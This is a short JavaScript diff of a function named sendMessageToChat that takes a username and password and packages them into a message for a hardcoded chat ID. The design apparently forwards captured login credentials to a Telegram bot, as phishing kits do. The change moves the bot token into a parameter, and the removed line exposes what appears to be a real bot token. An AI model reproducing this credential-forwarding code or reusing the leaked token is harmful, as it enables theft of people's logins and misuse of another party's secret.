@@ -1,7 +1,6 @@
-export default function sendMessageToChat(username, password) {
+export default function sendMessageToChat(username, password, token) {
     // const chatId = '7487498429'// se elimino
     const chatId = 7087786159 // id abisai
-    const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
     const message = JSON.stringify({
         chat_id: chatId,
         text: {
